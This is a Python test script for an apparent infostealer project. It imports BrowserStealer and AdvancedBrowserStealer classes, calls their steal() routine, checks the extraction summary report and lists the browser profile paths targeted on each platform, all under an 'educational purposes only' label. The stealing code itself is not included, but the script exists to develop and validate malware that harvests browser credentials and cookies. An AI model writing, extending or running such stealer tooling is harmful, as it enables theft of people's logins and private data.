#!/usr/bin/env python3
"""
Test script for the enhanced BrowserStealer module
Educational purposes only
"""

import os
import sys
import tempfile
import json
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

from core.browsers import BrowserStealer, AdvancedBrowserStealer

def test_browser_stealer():
    """Test the BrowserStealer functionality"""
    print("Testing Enhanced BrowserStealer...")
    
    # Create temporary output directory
    with tempfile.TemporaryDirectory() as temp_dir:
        print(f"Using temporary directory: {temp_dir}")
        
        # Initialize stealer
        stealer = BrowserStealer(temp_dir)
        print(f"Platform detected: {stealer.platform}")
        print(f"Browsers configured: {list(stealer.browsers.keys())}")
        
        # Test stealer execution (will not find real browsers in test environment)
        success = stealer.steal()
        print(f"Stealer execution result: {success}")
        
        # Check output directory structure
        browsers_dir = os.path.join(temp_dir, "Browsers")
        if os.path.exists(browsers_dir):
            print("Browser output directory created successfully")
            
            # Check for summary report
            summary_file = os.path.join(browsers_dir, "extraction_summary.json")
            if os.path.exists(summary_file):
                with open(summary_file, 'r') as f:
                    summary = json.load(f)
                print(f"Summary report generated: {summary}")
        
        # Test advanced stealer
        print("\nTesting AdvancedBrowserStealer...")
        advanced_stealer = AdvancedBrowserStealer(temp_dir)
        print("Advanced stealer initialized successfully")

def test_cross_platform_paths():
    """Test cross-platform path detection"""
    print("\nTesting cross-platform path detection...")
    
    with tempfile.TemporaryDirectory() as temp_dir:
        stealer = BrowserStealer(temp_dir)
        
        print("Browser paths by platform:")
        for browser, info in stealer.browsers.items():
            print(f"  {browser}: {info['path']} ({info['type']})")

if __name__ == "__main__":
    try:
        test_browser_stealer()
        test_cross_platform_paths()
        print("\n✅ All tests completed successfully!")
    except Exception as e:
        print(f"\n❌ Test failed: {e}")
        import traceback
        traceback.print_exc()